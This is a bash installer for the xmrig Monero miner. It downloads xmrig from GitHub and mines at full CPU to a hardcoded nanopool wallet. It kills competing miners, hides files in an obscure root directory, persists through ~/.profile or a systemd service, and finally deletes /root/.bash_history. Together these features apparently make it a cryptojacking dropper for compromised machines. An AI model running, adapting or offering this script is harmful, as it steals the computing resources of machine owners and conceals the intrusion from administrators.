#!/bin/bash

VERSION=2.12:PRIVATE

# printing greetings

echo "Mining setup script v$VERSION."
echo

mkdir /zkygU3jattJNENa9rmnzyE7kh2ypXCrDDJkEyyU8eBBuc7NE

if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not adviced to run this script under root"
fi

# command line arguments
WALLET=41y3THaZL7fNatuFGFUpF13DkZCpETkMzF6nzDpAXmYDbJRE6zvfypoRUFLHeMrJRz6gCGiDMLBNiLRd1faxKnPvHYkU7E4

# checking prerequisites

if [ -z $WALLET ]; then
  echo "Script usage:"
  echo "> m1nr.sh <optional wallet address>"
  echo "ERROR: Please specify your wallet address"
  exit 1
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
  exit 1
fi

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi

#if ! sudo -n true 2>/dev/null; then
#  if ! pidof systemd >/dev/null; then
#    echo "ERROR: This script requires systemd to work correctly"
#    exit 1
#  fi
#fi

# calculating port

CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

power2() {
  if ! type bc >/dev/null; then
    if   [ "$1" -gt "8192" ]; then
      echo "8192"
    elif [ "$1" -gt "4096" ]; then
      echo "4096"
    elif [ "$1" -gt "2048" ]; then
      echo "2048"
    elif [ "$1" -gt "1024" ]; then
      echo "1024"
    elif [ "$1" -gt "512" ]; then
      echo "512"
    elif [ "$1" -gt "256" ]; then
      echo "256"
    elif [ "$1" -gt "128" ]; then
      echo "128"
    elif [ "$1" -gt "64" ]; then
      echo "64"
    elif [ "$1" -gt "32" ]; then
      echo "32"
    elif [ "$1" -gt "16" ]; then
      echo "16"
    elif [ "$1" -gt "8" ]; then
      echo "8"
    elif [ "$1" -gt "4" ]; then
      echo "4"
    elif [ "$1" -gt "2" ]; then
      echo "2"
    else
      echo "1"
    fi
  else 
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
  fi
}

ipList=("xmr-eu1.nanopool.org"
  "xmr-eu2.nanopool.org"
  "xmr-us-east1.nanopool.org"
  "xmr-us-west1.nanopool.org"
  "xmr-asia1.nanopool.org"
  "xmr-jp1.nanopool.org"
  "xmr-au1.nanopool.org")

# calculating ip
curl ipinfo.io

echo
echo "[*] Please select your desired pool:"
echo
echo "1) ${ipList[0]}"
echo "2) ${ipList[1]}"
echo "3) ${ipList[2]}"
echo "4) ${ipList[3]}"
echo "5) ${ipList[4]}"
echo "6) ${ipList[5]}"
echo "7) ${ipList[6]}"
echo -n

read;
IP=${ipList[${REPLY}-1]}
echo $IP

# printing intentions

echo "I will download, setup and run in background Monero CPU miner."
echo "If needed, miner in foreground can be started by $HOME/nanopool/miner.sh script."
echo "Mining will happen to $WALLET wallet."
echo

if ! sudo -n true 2>/dev/null; then
  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
else
  echo "Mining in background will be performed using moneroocean_miner systemd service."
fi

echo
echo "JFYI: This host has $CPU_THREADS CPU threads, so projected Monero hashrate is around $EXP_MONERO_HASHRATE KH/s."
echo

# echo "Sleeping for 15 seconds before continuing (press Ctrl+C to cancel)"
# sleep 15
# sleep 2
echo
echo

# start doing stuff: preparing miner

echo "[*] Removing previous moneroocean miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop moneroocean_miner.service
fi
killall -9 xmrig

echo "[*] Removing $HOME/moneroocean directory"
rm -rf $HOME/moneroocean

echo "[*] Removing $HOME/nanopool directory"
rm -rf $HOME/nanopool

# Setting new home
HOME=/zkygU3jattJNENa9rmnzyE7kh2ypXCrDDJkEyyU8eBBuc7NE

echo "[*] Downloading xmrig to /tmp/xmrig.tar.gz"
if ! curl -L --progress-bar "https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz file to /tmp/xmrig.tar.gz"
  exit 1
fi

echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/nanopool"
[ -d $HOME/nanopool ] || mkdir $HOME/nanopool
if ! tar xf /tmp/xmrig.tar.gz -C $HOME/nanopool --strip 1; then
  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/nanopool directory"
  exit 1
fi
rm /tmp/xmrig.tar.gz

echo "[*] Checking if advanced version of $HOME/nanopool/xmrig works fine (and not removed by antivirus software)"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/nanopool/config.json
$HOME/nanopool/xmrig --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/nanopool/xmrig ]; then
    echo "WARNING: Advanced version of $HOME/nanopool/xmrig is not functional"
  else 
    echo "WARNING: Advanced version of $HOME/nanopool/xmrig was removed by antivirus (or some other problem)"
  fi
fi

echo "[*] Miner $HOME/nanopool/xmrig is OK"

PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi

sed -i 's/"url": *"[^"]*",/"url": "'$IP':14433",/' $HOME/nanopool/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'.'$PASS'\/'$WALLET'",/' $HOME/nanopool/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/nanopool/config.json
sed -i 's#"algo": *null,#"algo": "rx/0",#' $HOME/nanopool/config.json
sed -i 's#"log-file": *null,#"log-file": "'$HOME/nanopool/xmrig.log'",#' $HOME/nanopool/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/nanopool/config.json
sed -i 's/"tls": *false,/"tls": true,/' $HOME/nanopool/config.json

cp $HOME/nanopool/config.json $HOME/nanopool/config_background.json
sed -i 's/"background": *false,/"background": true,/' $HOME/nanopool/config_background.json

# preparing script

echo "[*] Creating $HOME/nanopool/miner.sh script"
cat >$HOME/nanopool/miner.sh <<EOL
#!/bin/bash
if ! pidof xmrig >/dev/null; then
  nice $HOME/nanopool/xmrig \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
fi
EOL

chmod +x $HOME/nanopool/miner.sh

# preparing script background work and work under reboot

if ! sudo -n true 2>/dev/null; then
  if ! grep moneroocean/miner.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding $HOME/nanopool/miner.sh script to $HOME/.profile"
    echo "$HOME/nanopool/miner.sh --config=$HOME/nanopool/config_background.json >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like $HOME/nanopool/miner.sh script is already in the $HOME/.profile"
  fi
  echo "[*] Running miner in the background (see logs in $HOME/nanopool/xmrig.log file)"
  /bin/bash $HOME/nanopool/miner.sh --config=$HOME/nanopool/config_background.json >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
    echo "[*] Enabling huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    echo "[*] Running miner in the background (see logs in $HOME/nanopool/xmrig.log file)"
    /bin/bash $HOME/nanopool/miner.sh --config=$HOME/nanopool/config_background.json >/dev/null 2>&1
    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."

  else

    echo "[*] Creating moneroocean_miner systemd service"
    cat >/tmp/moneroocean_miner.service <<EOL
[Unit]
Description=Monero miner service

[Service]
ExecStart=$HOME/nanopool/xmrig --config=$HOME/nanopool/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/moneroocean_miner.service /etc/systemd/system/moneroocean_miner.service
    echo "[*] Starting moneroocean_miner systemd service"
    sudo killall xmrig 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable moneroocean_miner.service
    sudo systemctl start moneroocean_miner.service
    echo "To see miner service logs run \"sudo journalctl -u moneroocean_miner -f\" command"
  fi
fi

echo
echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
if [ "$CPU_THREADS" -lt "4" ]; then
  echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
  echo "sudo cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b"
  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
    echo "sudo sed -i -e '\$acpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  else
    echo "sudo sed -i -e '\$i \\cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  fi
else
  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/nanopool/config.json"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/nanopool/config_background.json"
fi
echo

echo "[*] Setup complete"
echo "[*] Checking service"
sleep 1
systemctl status moneroocean_miner
echo "[*] Removing history"
rm -rf /root/.bash_history
